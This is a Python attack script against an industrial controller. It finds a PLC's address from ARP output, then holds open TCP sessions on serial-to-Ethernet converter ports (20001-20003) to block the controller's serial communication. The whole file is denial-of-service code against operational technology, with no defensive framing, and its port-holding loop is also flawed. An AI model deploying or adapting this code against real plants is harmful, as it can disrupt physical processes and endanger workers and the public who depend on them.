import socket
import time
import subprocess
import re

def find_plc_ip():
    """Finds the PLC IP address using ARP scanning."""
    try:
        # Run the arp command and extract IP/MAC addresses
        arp_output = subprocess.check_output("arp -a", shell=True, encoding='utf-8')

        # Regex to identify IP addresses
        ip_pattern = re.findall(r'\d+\.\d+\.\d+\.\d+', arp_output)

        # Assuming the PLC IP is in the same subnet as the workstation, pick the most probable one
        plc_ip = None
        for ip in ip_pattern:
            if ip.startswith("10.0.0."):  # Adjust subnet accordingly
                plc_ip = ip
                break

        if not plc_ip:
            raise Exception("Could not identify the PLC's IP address.")

        print(f"Discovered PLC IP: {plc_ip}")
        return plc_ip

    except Exception as e:
        print(f"Error finding PLC IP: {e}")
        return None

def block_serial_com(plc_ip):
    """Attempts to block serial communication by opening a TCP session on known serial-to-Ethernet port(s)."""
    ports = [20001, 20002, 20003]  # Common serial-to-Ethernet converter port mappings

    for port in ports:
        try:
            print(f"Attempting to block serial COM by holding open connection to {plc_ip}:{port}...")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)  # Set timeout for connection attempt
            sock.connect((plc_ip, port))  # Connect to the port
            print(f"Connection to {plc_ip}:{port} established and held open.")
        except socket.error as err:
            print(f"Could not connect to {plc_ip}:{port} - Port may already be blocked or in use.")
        finally:
            # Keeping the socket open
            time.sleep(60 * 60)  # Keep open for an hour (adjust as needed)

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        block_serial_com(plc_ip)